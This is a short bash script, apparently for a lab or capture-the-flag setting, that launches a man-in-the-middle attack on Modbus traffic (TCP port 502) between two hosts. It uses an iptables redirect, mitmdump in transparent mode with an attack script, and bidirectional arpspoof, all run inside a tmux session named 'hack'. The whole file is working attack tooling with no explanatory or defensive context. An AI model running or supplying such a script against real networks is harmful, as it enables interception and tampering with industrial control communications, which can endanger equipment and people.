#!/bin/bash

tmux new-session -d -s hack
tmux send 'iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 502 -j REDIRECT --to-port 9090' ENTER
tmux send 'mitmdump -p 9090 -m transparent -s /root/aitm.py' ENTER
tmux split-window -h
tmux send 'arpspoof -t 10.11.12.100 10.11.12.102' ENTER
tmux split-window
tmux send 'arpspoof -t 10.11.12.102 10.11.12.100' ENTER

tmux attach
